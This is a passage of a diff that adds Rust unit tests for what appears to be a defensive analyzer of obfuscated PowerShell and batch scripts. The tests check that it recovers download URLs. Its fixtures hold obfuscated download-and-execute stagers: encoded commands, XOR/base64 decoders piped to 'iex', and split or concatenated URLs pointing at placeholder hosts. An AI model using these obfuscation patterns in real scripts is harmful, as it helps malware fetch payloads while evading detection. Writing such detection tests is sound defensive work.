+        });
+        assert!(
+            has,
+            "no Download from raw PowerShell Invoke-WebRequest variable URL/destination: {:?}",
             report.traits
         );
     }
@@ -7481,12 +14995,22 @@ POW%!A%RSH%!A%LL.%!A%X%!A% -N^O^P -%!A%X%!A%C B^YPA^SS -NO^NI [BYT%!A%[]];$XCZM=
         assert!(
             report.traits.iter().any(|t| {
                 matches!(t,
+                    Trait::Download { src, .. }
+                        if src == "https://payload.example/a.png"
+                )
+            }),
+            "raw marker PowerShell URL was not typed as Download: {:?}",
+            report.traits
+        );
+        assert!(
+            !report.traits.iter().any(|t| {
+                matches!(t,
                     Trait::DownloadInDeobText { src, line_hint }
                         if src == "https://payload.example/a.png"
                         && line_hint == "raw-marker-powershell"
                 )
             }),
-            "raw marker PowerShell URL missed: {:?}",
+            "raw marker PowerShell URL was double-emitted as generic: {:?}",
             report.traits
         );
     }
@@ -7656,6 +15180,343 @@ mod ps1_obfuscation_tests {
     }
 
     #[test]
+    fn ps1_char_plus_literal_concat_resolves_url() {
+        use base64::Engine;
+        let inner = r#"(New-Object Net.WebClient).DownloadString([char]104 + 'ttp://ps-char-literal.example/payload')"#;
+        let b64 = base64::engine::general_purpose::STANDARD.encode(
+            inner
+                .encode_utf16()
+                .flat_map(|c| c.to_le_bytes())
+                .collect::<Vec<_>>(),
+        );
+        let script = format!("powershell -EncodedCommand {}\r\n", b64);
+        let report = analyze(script.as_bytes(), &Config::default());
+        let has = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "http://ps-char-literal.example/payload"
+            )
+        });
+        assert!(
+            has,
+            "PowerShell [char] + literal URL concat missed: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn ps1_literal_char_literal_concat_resolves_url() {
+        use base64::Engine;
+        let inner = r#"(New-Object Net.WebClient).DownloadString('ht' + [char]116 + 'p://ps-lit-char.example/payload')"#;
+        let b64 = base64::engine::general_purpose::STANDARD.encode(
+            inner
+                .encode_utf16()
+                .flat_map(|c| c.to_le_bytes())
+                .collect::<Vec<_>>(),
+        );
+        let script = format!("powershell -EncodedCommand {}\r\n", b64);
+        let report = analyze(script.as_bytes(), &Config::default());
+        let has = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "http://ps-lit-char.example/payload"
+            )
+        });
+        assert!(
+            has,
+            "PowerShell literal + [char] + literal URL concat missed: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn ps1_format_double_quoted_resolves_url() {
+        use base64::Engine;
+        let inner =
+            r#"Invoke-WebRequest -Uri ("{0}{1}{2}" -f "ht","tps://ps-format-dq.example","/stage")"#;
+        let b64 = base64::engine::general_purpose::STANDARD.encode(
+            inner
+                .encode_utf16()
+                .flat_map(|c| c.to_le_bytes())
+                .collect::<Vec<_>>(),
+        );
+        let script = format!("powershell -EncodedCommand {}\r\n", b64);
+        let report = analyze(script.as_bytes(), &Config::default());
+        let has = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://ps-format-dq.example/stage"
+            )
+        });
+        assert!(
+            has,
+            "double-quoted PS format URL was not deobfuscated: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn ps1_string_join_static_resolves_url() {
+        use base64::Engine;
+        let inner = r#"Invoke-WebRequest -Uri ([string]::Join('', @('https://','ps-string-join.example','/stage')))"#;
+        let b64 = base64::engine::general_purpose::STANDARD.encode(
+            inner
+                .encode_utf16()
+                .flat_map(|c| c.to_le_bytes())
+                .collect::<Vec<_>>(),
+        );
+        let script = format!("powershell -EncodedCommand {}\r\n", b64);
+        let report = analyze(script.as_bytes(), &Config::default());
+        let has = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://ps-string-join.example/stage"
+            )
+        });
+        assert!(
+            has,
+            "PowerShell [string]::Join URL was not deobfuscated: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn ps1_string_concat_static_resolves_url() {
+        use base64::Engine;
+        let inner = r#"Invoke-WebRequest -Uri ([string]::Concat('https://','ps-string-concat.example','/stage'))"#;
+        let b64 = base64::engine::general_purpose::STANDARD.encode(
+            inner
+                .encode_utf16()
+                .flat_map(|c| c.to_le_bytes())
+                .collect::<Vec<_>>(),
+        );
+        let script = format!("powershell -EncodedCommand {}\r\n", b64);
+        let report = analyze(script.as_bytes(), &Config::default());
+        let has = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://ps-string-concat.example/stage"
+            )
+        });
+        assert!(
+            has,
+            "PowerShell [string]::Concat URL was not deobfuscated: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn ps1_string_format_static_resolves_url() {
+        use base64::Engine;
+        let inner = r#"Invoke-WebRequest -Uri ([string]::Format('{0}{1}{2}', 'https://', 'ps-string-format.example', '/stage'))"#;
+        let b64 = base64::engine::general_purpose::STANDARD.encode(
+            inner
+                .encode_utf16()
+                .flat_map(|c| c.to_le_bytes())
+                .collect::<Vec<_>>(),
+        );
+        let script = format!("powershell -EncodedCommand {}\r\n", b64);
+        let report = analyze(script.as_bytes(), &Config::default());
+        let has = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://ps-string-format.example/stage"
+            )
+        });
+        assert!(
+            has,
+            "PowerShell [string]::Format URL was not deobfuscated: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn ps1_ireplace_literal_resolves_url() {
+        use base64::Engine;
+        let inner =
+            r#"Invoke-WebRequest -Uri ('hxxps://ps-ireplace.example/stage' -ireplace 'xx','tt')"#;
+        let b64 = base64::engine::general_purpose::STANDARD.encode(
+            inner
+                .encode_utf16()
+                .flat_map(|c| c.to_le_bytes())
+                .collect::<Vec<_>>(),
+        );
+        let script = format!("powershell -EncodedCommand {}\r\n", b64);
+        let report = analyze(script.as_bytes(), &Config::default());
+        let has = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://ps-ireplace.example/stage"
+            )
+        });
+        assert!(
+            has,
+            "PowerShell -ireplace URL was not deobfuscated: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn ps1_ireplace_literal_is_case_insensitive() {
+        use base64::Engine;
+        let inner = r#"Invoke-WebRequest -Uri ('hXXps://ps-ireplace-ci.example/stage' -ireplace 'xx','tt')"#;
+        let b64 = base64::engine::general_purpose::STANDARD.encode(
+            inner
+                .encode_utf16()
+                .flat_map(|c| c.to_le_bytes())
+                .collect::<Vec<_>>(),
+        );
+        let script = format!("powershell -EncodedCommand {}\r\n", b64);
+        let report = analyze(script.as_bytes(), &Config::default());
+        assert!(
+            report
+                .deobfuscated
+                .contains("https://ps-ireplace-ci.example/stage"),
+            "PowerShell -ireplace should normalize case-insensitive replacement: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn ps1_double_quoted_ireplace_literal_resolves_url() {
+        use base64::Engine;
+        let inner = r#"Invoke-WebRequest -Uri ("hxxps://ps-ireplace-dq.example/stage" -ireplace "xx","tt")"#;
+        let b64 = base64::engine::general_purpose::STANDARD.encode(
+            inner
+                .encode_utf16()
+                .flat_map(|c| c.to_le_bytes())
+                .collect::<Vec<_>>(),
+        );
+        let script = format!("powershell -EncodedCommand {}\r\n", b64);
+        let report = analyze(script.as_bytes(), &Config::default());
+        let has = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://ps-ireplace-dq.example/stage"
+            )
+        });
+        assert!(
+            has,
+            "PowerShell double-quoted -ireplace URL was not deobfuscated: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn ps1_double_quoted_replace_literal_resolves_url() {
+        use base64::Engine;
+        let inner = r#"Invoke-WebRequest -Uri ("hxxps://ps-dot-replace-dq.example/stage".Replace("xx","tt"))"#;
+        let b64 = base64::engine::general_purpose::STANDARD.encode(
+            inner
+                .encode_utf16()
+                .flat_map(|c| c.to_le_bytes())
+                .collect::<Vec<_>>(),
+        );
+        let script = format!("powershell -EncodedCommand {}\r\n", b64);
+        let report = analyze(script.as_bytes(), &Config::default());
+        let has = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://ps-dot-replace-dq.example/stage"
+            )
+        });
+        assert!(
+            has,
+            "PowerShell double-quoted literal .Replace URL was not deobfuscated: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn ps1_split_join_literal_resolves_url() {
+        use base64::Engine;
+        let inner = r#"Invoke-WebRequest -Uri (('h,t,t,p,s,:,/,/,ps-splitjoin.example,/stage' -split ',') -join '')"#;
+        let b64 = base64::engine::general_purpose::STANDARD.encode(
+            inner
+                .encode_utf16()
+                .flat_map(|c| c.to_le_bytes())
+                .collect::<Vec<_>>(),
+        );
+        let script = format!("powershell -EncodedCommand {}\r\n", b64);
+        let report = analyze(script.as_bytes(), &Config::default());
+        let has = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://ps-splitjoin.example/stage"
+            )
+        });
+        assert!(
+            has,
+            "PowerShell split/join URL was not deobfuscated: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn ps1_isplit_join_literal_resolves_url() {
+        use base64::Engine;
+        let inner = r#"Invoke-WebRequest -Uri (('h|t|t|p|s|:|/|/|ps-isplitjoin.example|/stage' -isplit '\|') -join '')"#;
+        let b64 = base64::engine::general_purpose::STANDARD.encode(
+            inner
+                .encode_utf16()
+                .flat_map(|c| c.to_le_bytes())
+                .collect::<Vec<_>>(),
+        );
+        let script = format!("powershell -EncodedCommand {}\r\n", b64);
+        let report = analyze(script.as_bytes(), &Config::default());
+        let has = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://ps-isplitjoin.example/stage"
+            )
+        });
+        assert!(
+            has,
+            "PowerShell -isplit/join URL was not deobfuscated: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn ps1_substring_literal_resolves_url() {
+        use base64::Engine;
+        let inner =
+            r#"Invoke-WebRequest -Uri ('xxhttps://ps-substring.example/stageyy'.Substring(2, 34))"#;
+        let b64 = base64::engine::general_purpose::STANDARD.encode(
+            inner
+                .encode_utf16()
+                .flat_map(|c| c.to_le_bytes())
+                .collect::<Vec<_>>(),
+        );
+        let script = format!("powershell -EncodedCommand {}\r\n", b64);
+        let report = analyze(script.as_bytes(), &Config::default());
+        let has = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://ps-substring.example/stage"
+            )
+        });
+        assert!(
+            has,
+            "PowerShell literal Substring URL was not deobfuscated: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn ps1_double_quoted_substring_literal_resolves_url() {
+        use base64::Engine;
+        let inner = r#"Invoke-WebRequest -Uri ("xxhttps://ps-substring-dq.example/stageyy".Substring(2, 37))"#;
+        let b64 = base64::engine::general_purpose::STANDARD.encode(
+            inner
+                .encode_utf16()
+                .flat_map(|c| c.to_le_bytes())
+                .collect::<Vec<_>>(),
+        );
+        let script = format!("powershell -EncodedCommand {}\r\n", b64);
+        let report = analyze(script.as_bytes(), &Config::default());
+        let has = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://ps-substring-dq.example/stage"
+            )
+        });
+        assert!(
+            has,
+            "PowerShell double-quoted literal Substring URL was not deobfuscated: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn ps1_base64_string_decoded() {
         use base64::Engine;
         // After expanding [System.Convert]::FromBase64String('...') → 'http://b64.example/z'
@@ -7683,6 +15544,226 @@ mod ps1_obfuscation_tests {
     }
 
     #[test]
+    fn ps1_normalization_decodes_getstring_base64_variable() {
+        use base64::Engine;
+
+        let filler: String = (0..2048).map(|n| format!("{n:04x}")).collect();
+        let decoded =
+            format!("Invoke-WebRequest -Uri https://b64-var.example/stage.ps1\r\n# {filler}");
+        let b64 = base64::engine::general_purpose::STANDARD.encode(decoded.as_bytes());
+        let ps = format!(
+            "$blob = '{b64}'; $stage = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($blob)); iex $stage"
+        );
+        let normalized = crate::ps1_scan::normalize_ps1_text(&ps);
+        assert!(
+            normalized.contains("https://b64-var.example/stage.ps1"),
+            "base64 variable script was not decoded:\n{}",
+            normalized
+        );
+        assert!(
+            !normalized.contains("FromBase64String($blob)"),
+            "base64 variable GetString call should be replaced:\n{}",
+            normalized
+        );
+    }
+
+    #[test]
+    fn ps1_normalization_decodes_trimmed_getstring_base64_variable() {
+        use base64::Engine;
+
+        let decoded = "Invoke-WebRequest -Uri https://b64-var-trim.example/stage.ps1";
+        let b64 = base64::engine::general_purpose::STANDARD.encode(decoded.as_bytes());
+        let ps = format!(
+            "$blob = ' {b64} '; $stage = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($blob.Trim())); iex $stage"
+        );
+        let normalized = crate::ps1_scan::normalize_ps1_text(&ps);
+        assert!(
+            normalized.contains("https://b64-var-trim.example/stage.ps1"),
+            "trimmed base64 variable script was not decoded:\n{}",
+            normalized
+        );
+        assert!(
+            !normalized.contains("FromBase64String($blob.Trim())"),
+            "trimmed base64 variable GetString call should be replaced:\n{}",
+            normalized
+        );
+    }
+
+    #[test]
+    fn ps1_normalization_decodes_trimend_getstring_base64_variable() {
+        use base64::Engine;
+
+        let decoded = "Invoke-WebRequest -Uri https://b64-var-trimend.example/stage.ps1";
+        let b64 = base64::engine::general_purpose::STANDARD.encode(decoded.as_bytes());
+        let ps = format!(
+            "$blob = '{b64}   '; $stage = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($blob.TrimEnd())); iex $stage"
+        );
+        let normalized = crate::ps1_scan::normalize_ps1_text(&ps);
+        assert!(
+            normalized.contains("https://b64-var-trimend.example/stage.ps1"),
+            "TrimEnd base64 variable script was not decoded:\n{}",
+            normalized
+        );
+        assert!(
+            !normalized.contains("FromBase64String($blob.TrimEnd())"),
+            "TrimEnd base64 variable GetString call should be replaced:\n{}",
+            normalized
+        );
+    }
+
+    #[test]
+    fn ps1_normalization_decodes_replace_cleaned_getstring_base64_variable() {
+        use base64::Engine;
+
+        let decoded = "Invoke-WebRequest -Uri https://b64-var-replace.example/stage.ps1";
+        let b64 = base64::engine::general_purpose::STANDARD.encode(decoded.as_bytes());
+        let midpoint = b64.len() / 2;
+        let noisy = format!("{}XYZmarker{}", &b64[..midpoint], &b64[midpoint..]);
+        let ps = format!(
+            "$blob = '{noisy}'.Replace('XYZmarker',''); $stage = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($blob)); iex $stage"
+        );
+        let normalized = crate::ps1_scan::normalize_ps1_text(&ps);
+        assert!(
+            normalized.contains("https://b64-var-replace.example/stage.ps1"),
+            "Replace-cleaned base64 variable script was not decoded:\n{}",
+            normalized
+        );
+        assert!(
+            !normalized.contains("FromBase64String($blob)"),
+            "Replace-cleaned base64 variable GetString call should be replaced:\n{}",
+            normalized
+        );
+    }
+
+    #[test]
+    fn ps1_normalization_decodes_parenthesized_getstring_base64_variable() {
+        use base64::Engine;
+
+        let decoded = "Invoke-WebRequest -Uri https://b64-var-paren.example/stage.ps1";
+        let b64 = base64::engine::general_purpose::STANDARD.encode(decoded.as_bytes());
+        let ps = format!(
+            "$blob = '{b64}'; $stage = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String(($blob))); iex $stage"
+        );
+        let normalized = crate::ps1_scan::normalize_ps1_text(&ps);
+        assert!(
+            normalized.contains("https://b64-var-paren.example/stage.ps1"),
+            "parenthesized base64 variable script was not decoded:\n{}",
+            normalized
+        );
+        assert!(
+            !normalized.contains("FromBase64String(($blob))"),
+            "parenthesized base64 variable GetString call should be replaced:\n{}",
+            normalized
+        );
+    }
+
+    #[test]
+    fn ps1_normalization_decodes_trimmed_getstring_base64_literal() {
+        use base64::Engine;
+
+        let decoded = "Invoke-WebRequest -Uri https://b64-lit-trim.example/stage.ps1";
+        let b64 = base64::engine::general_purpose::STANDARD.encode(decoded.as_bytes());
+        let ps = format!(
+            "[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String(' {b64} '.Trim())) | iex"
+        );
+        let normalized = crate::ps1_scan::normalize_ps1_text(&ps);
+        assert!(
+            normalized.contains("https://b64-lit-trim.example/stage.ps1"),
+            "trimmed base64 literal script was not decoded:\n{}",
+            normalized
+        );
+        assert!(
+            !normalized.contains("FromBase64String('"),
+            "trimmed base64 literal GetString call should be replaced:\n{}",
+            normalized
+        );
+    }
+
+    #[test]
+    fn ps1_normalization_decodes_parenthesized_getstring_base64_literal() {
+        use base64::Engine;
+
+        let decoded = "Invoke-WebRequest -Uri https://b64-lit-paren.example/stage.ps1";
+        let b64 = base64::engine::general_purpose::STANDARD.encode(decoded.as_bytes());
+        let ps = format!(
+            "[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String(('{b64}'))) | iex"
+        );
+        let normalized = crate::ps1_scan::normalize_ps1_text(&ps);
+        assert!(
+            normalized.contains("https://b64-lit-paren.example/stage.ps1"),
+            "parenthesized base64 literal script was not decoded:\n{}",
+            normalized
+        );
+        assert!(
+            !normalized.contains("FromBase64String(('"),
+            "parenthesized base64 literal GetString call should be replaced:\n{}",
+            normalized
+        );
+    }
+
+    #[test]
+    fn ps1_normalization_decodes_byte_array_getstring() {
+        let bytes = "https://byte-array.example/stage.ps1"
+            .bytes()
+            .map(|b| b.to_string())
+            .collect::<Vec<_>>()
+            .join(",");
+        let ps = format!("[Text.Encoding]::ASCII.GetString([byte[]]({bytes})) | iex");
+
+        let normalized = crate::ps1_scan::normalize_ps1_text(&ps);
+
+        assert!(
+            normalized.contains("https://byte-array.example/stage.ps1"),
+            "byte-array GetString call was not decoded:\n{}",
+            normalized
+        );
+    }
+
+    #[test]
+    fn ps1_normalization_does_not_substitute_large_binary_base64_variable() {
+        use base64::Engine;
+
+        let mut binary = b"MZ\x00\x01\x02\x03".to_vec();
+        binary.extend((0..=255).cycle().take(12_000));
+        let b64 = base64::engine::general_purpose::STANDARD.encode(binary);
+        let ps = format!("$blob = '{b64}'; $buf = [Convert]::FromBase64String($blob)");
+        let normalized = crate::ps1_scan::normalize_ps1_text(&ps);
+        assert!(
+            normalized.contains("FromBase64String($blob)"),
+            "large binary base64 variable should not be substituted:\n{}",
+            normalized
+        );
+        assert_eq!(
+            normalized.matches(&b64).count(),
+            1,
+            "large base64 carrier should not be duplicated into call sites:\n{}",
+            normalized
+        );
+    }
+
+    #[test]
+    fn ps1_normalization_does_not_substitute_large_binary_base64_literal() {
+        use base64::Engine;
+
+        let mut binary = b"MZ\x00\x01\x02\x03".to_vec();
+        binary.extend((0..=255).cycle().take(12_000));
+        let b64 = base64::engine::general_purpose::STANDARD.encode(binary);
+        let ps = format!("$buf = [Convert]::FromBase64String('{b64}')");
+        let normalized = crate::ps1_scan::normalize_ps1_text(&ps);
+        assert!(
+            normalized.contains("FromBase64String"),
+            "large binary base64 literal should not be substituted:\n{}",
+            normalized
+        );
+        assert_eq!(
+            normalized.matches(&b64).count(),
+            1,
+            "large base64 literal should remain a single encoded carrier:\n{}",
+            normalized
+        );
+    }
+
+    #[test]
     fn ps1_convert_base64_unwraps_nested_script() {
         use base64::Engine;
         let decoded = r#"$url = "https://biteblob.example/Download/build.exe"; Invoke-WebRequest -Uri $url -OutFile "$env:TEMP\file.exe""#;
@@ -7705,6 +15786,2232 @@ mod ps1_obfuscation_tests {
             has,
             "no Download from nested [Convert] script: {:?}",
             report.traits
+        );
+    }
+
+    #[test]
+    fn ps1_xor_base64_function_call_decodes_nested_command() {
+        use base64::Engine;
+
+        fn encode_xor_b64(value: &str, key: &[u8]) -> String {
+            let encoded: Vec<u8> = value
+                .bytes()
+                .enumerate()
+                .map(|(idx, byte)| byte ^ key[idx % key.len()])
+                .collect();
+            base64::engine::general_purpose::STANDARD.encode(encoded)
+        }
+
+        let key = b"uknkkeliges";
+        let decoded = "Invoke-WebRequest -Uri https://ps-xor-b64-fn.example/stage.ps1";
+        let blob = encode_xor_b64(decoded, key);
+        let script = format!(
+            r#"$omprioriteringen=@(117,107,110,107,107,101,108,105,103,101,115);
+function Unvertically ($pauver,$execute=0) {{
+  $bytes=[Convert]::FromBase64String($pauver);
+  $out=0..($bytes.Length-1)|%{{ $bytes[$_] -bxor $omprioriteringen[$_%$omprioriteringen.Length] }};
+  [Text.Encoding]::ASCII.GetString($out)
+}}
+Unvertically '{blob}' 1"#
+        );
+        let report = analyze(
+            format!("powershell -Command \"{}\"\r\n", script.replace('"', "`\"")).as_bytes(),
+            &Config::default(),
+        );
+        let has = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://ps-xor-b64-fn.example/stage.ps1"
+            )
+        });
+        assert!(
+            has,
+            "xor/base64 function call was not decoded: {:?}\n{}",
+            report.traits, report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn inline_ps1_xor_base64_function_surfaces_decoded_payload_in_deob() {
+        use base64::Engine;
+
+        fn encode_xor_b64(value: &str, key: &[u8]) -> String {
+            let encoded: Vec<u8> = value
+                .bytes()
+                .enumerate()
+                .map(|(idx, byte)| byte ^ key[idx % key.len()])
+                .collect();
+            base64::engine::general_purpose::STANDARD.encode(encoded)
+        }
+
+        let key = b"uknkkeliges";
+        let url = "https://ps-inline-xor-visible.example/stage.ps1";
+        let decoded = format!("Invoke-WebRequest -Uri {url}");
+        let blob = encode_xor_b64(&decoded, key);
+        let script = format!(
+            r#"powershell "$omprioriteringen=@(117,107,110,107,107,101,108,105,103,101,115);function Unvertically ($pauver,$execute=0) {{$bytes=[Convert]::FromBase64String($pauver);$out=0..($bytes.Length-1)|%{{ $bytes[$_] -bxor $omprioriteringen[$_%$omprioriteringen.Length] }};[Text.Encoding]::ASCII.GetString($out)}};Unvertically '{blob}' 1""#
+        );
+        let report = analyze(script.as_bytes(), &Config::default());
+
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(t,
+                    Trait::Download { src, .. } if src == url
+                )
+            }),
+            "inline xor/base64 URL was not extracted: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+        assert!(
+            report.deobfuscated.contains(url),
+            "decoded inline xor/base64 payload was not surfaced in deobfuscated output:\n{}",
+            report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn powershell_command_payload_preserves_percent_literals_before_ps_scan() {
+        let script = r#"powershell -Command "$pad='left%MISSING%right'; Invoke-WebRequest -Uri https://raw-percent-ps.example/stage.ps1""#;
+        let report = analyze(script.as_bytes(), &Config::default());
+        let extracted = report
+            .extracted_ps1
+            .iter()
+            .map(|body| String::from_utf8_lossy(body))
+            .collect::<Vec<_>>()
+            .join("\n---\n");
+        assert!(
+            extracted.contains("left%MISSING%right"),
+            "PowerShell command body was percent-expanded before PS scan:\n{}",
+            extracted
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(t,
+                    Trait::Download { src, .. } if src == "https://raw-percent-ps.example/stage.ps1"
+                )
+            }),
+            "raw PowerShell command URL was not extracted: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn ps1_markerless_xor_base64_extractor_call_decodes_nested_command() {
+        use base64::Engine;
+
+        fn encode_xor_b64(value: &str, key: &[u8]) -> String {
+            let encoded: Vec<u8> = value
+                .bytes()
+                .enumerate()
+                .map(|(idx, byte)| byte ^ key[idx % key.len()])
+                .collect();
+            base64::engine::general_purpose::STANDARD.encode(encoded)
+        }
+
+        let key = b"uknkkeliges";
+        let decoded = "Invoke-WebRequest -Uri https://ps-markerless-xor.example/stage.ps1";
+        let blob = encode_xor_b64(decoded, key);
+        let script = format!(
+            r#"$omprioriteringen=@(117,107,110,107,107,101,108,105,103,101,115);
+function Unvertically ($pauver,$execute=0) {{
+  $out=0..($pauver.Length-1)|%{{ $pauver[$_] -bxor $omprioriteringen[$_%$omprioriteringen.Length] }};
+  $out
+}}
+Unvertically '{blob}' 1"#
+        );
+        let report = analyze(
+            format!("powershell -Command \"{}\"\r\n", script.replace('"', "`\"")).as_bytes(),
+            &Config::default(),
+        );
+        let has = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://ps-markerless-xor.example/stage.ps1"
+            )
+        });
+        assert!(
+            has,
+            "markerless xor/base64 extractor call was not decoded: {:?}\n{}",
+            report.traits, report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn ps1_xor_base64_extractor_accepts_cast_byte_array_key() {
+        use base64::Engine;
+
+        fn encode_xor_b64(value: &str, key: &[u8]) -> String {
+            let encoded: Vec<u8> = value
+                .bytes()
+                .enumerate()
+                .map(|(idx, byte)| byte ^ key[idx % key.len()])
+                .collect();
+            base64::engine::general_purpose::STANDARD.encode(encoded)
+        }
+
+        let key = b"uknkkeliges";
+        let decoded = "Invoke-WebRequest -Uri https://ps-typed-xor-key.example/stage.ps1";
+        let blob = encode_xor_b64(decoded, key);
+        let script = format!(
+            r#"$omprioriteringen=[byte[]](117,107,110,107,107,101,108,105,103,101,115);
+function Unvertically ($pauver,$execute=0) {{
+  $out=0..($pauver.Length-1)|%{{ $pauver[$_] -bxor $omprioriteringen[$_%$omprioriteringen.Length] }};
+  $out
+}}
+Unvertically '{blob}' 1"#
+        );
+        let report = analyze(
+            format!("powershell -Command \"{}\"\r\n", script.replace('"', "`\"")).as_bytes(),
+            &Config::default(),
+        );
+        let has = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://ps-typed-xor-key.example/stage.ps1"
+            )
+        });
+        assert!(
+            has,
+            "typed byte-array xor key was not decoded: {:?}\n{}",
+            report.traits, report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn ps1_literal_substring_extractor_call_recovers_nested_command() {
+        use base64::Engine;
+
+        let decoded = "Invoke-WebRequest -Uri https://ps-extractor-call.example/stage.ps1";
+        let carrier = format!("zz{}yy", decoded);
+        let inner = format!(
+            r#"function Pick($value,$start,$count) {{
+  return $value.Substring($start,$count)
+}}
+Pick '{carrier}' 2 {len}"#,
+            len = decoded.len()
+        );
+        let b64 = base64::engine::general_purpose::STANDARD.encode(
+            inner
+                .encode_utf16()
+                .flat_map(|c| c.to_le_bytes())
+                .collect::<Vec<_>>(),
+        );
+        let script = format!("powershell -EncodedCommand {}\r\n", b64);
+        let report = analyze(script.as_bytes(), &Config::default());
+        let has = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://ps-extractor-call.example/stage.ps1"
+            )
+        });
+        assert!(
+            has,
+            "literal substring extractor call was not decoded: {:?}\n{}",
+            report.traits, report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn ps1_literal_reordered_substring_extractor_call_recovers_nested_command() {
+        use base64::Engine;
+
+        let decoded =
+            "Invoke-WebRequest -Uri https://ps-reordered-substring-extractor.example/stage.ps1";
+        let carrier = format!("zz{}yy", decoded);
+        let inner = format!(
+            r#"function Pick($unused,$value,$start,$count) {{
+  return $value.Substring($start,$count)
+}}
+Pick 0 '{carrier}' 2 {len}"#,
+            len = decoded.len()
+        );
+        let b64 = base64::engine::general_purpose::STANDARD.encode(
+            inner
+                .encode_utf16()
+                .flat_map(|c| c.to_le_bytes())
+                .collect::<Vec<_>>(),
+        );
+        let script = format!("powershell -EncodedCommand {}\r\n", b64);
+        let report = analyze(script.as_bytes(), &Config::default());
+        let has = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://ps-reordered-substring-extractor.example/stage.ps1"
+            )
+        });
+        assert!(
+            has,
+            "literal reordered substring extractor call was not decoded: {:?}\n{}",
+            report.traits, report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn ps1_literal_constant_substring_extractor_call_recovers_nested_command() {
+        use base64::Engine;
+
+        let decoded =
+            "Invoke-WebRequest -Uri https://ps-const-substring-extractor.example/stage.ps1";
+        let carrier = format!("zz{}yy", decoded);
+        let inner = format!(
+            r#"function Pick($value) {{
+  return $value.Substring(2,{len})
+}}
+Pick '{carrier}'"#,
+            len = decoded.len()
+        );
+        let b64 = base64::engine::general_purpose::STANDARD.encode(
+            inner
+                .encode_utf16()
+                .flat_map(|c| c.to_le_bytes())
+                .collect::<Vec<_>>(),
+        );
+        let script = format!("powershell -EncodedCommand {}\r\n", b64);
+        let report = analyze(script.as_bytes(), &Config::default());
+        let has = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://ps-const-substring-extractor.example/stage.ps1"
+            )
+        });
+        assert!(
+            has,
+            "literal constant substring extractor call was not decoded: {:?}\n{}",
+            report.traits, report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn ps1_literal_reordered_constant_substring_extractor_call_recovers_nested_command() {
+        use base64::Engine;
+
+        let decoded =
+            "Invoke-WebRequest -Uri https://ps-reordered-const-substring.example/stage.ps1";
+        let carrier = format!("zz{}yy", decoded);
+        let inner = format!(
+            r#"function Pick($unused,$value) {{
+  return $value.Substring(2,{len})
+}}
+Pick 0 '{carrier}'"#,
+            len = decoded.len()
+        );
+        let b64 = base64::engine::general_purpose::STANDARD.encode(
+            inner
+                .encode_utf16()
+                .flat_map(|c| c.to_le_bytes())
+                .collect::<Vec<_>>(),
+        );
+        let script = format!("powershell -EncodedCommand {}\r\n", b64);
+        let report = analyze(script.as_bytes(), &Config::default());
+        let has = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://ps-reordered-const-substring.example/stage.ps1"
+            )
+        });
+        assert!(
+            has,
+            "literal reordered constant substring extractor call was not decoded: {:?}\n{}",
+            report.traits, report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn ps1_hyphenated_function_name_extractor_call_recovers_nested_command() {
+        use base64::Engine;
+
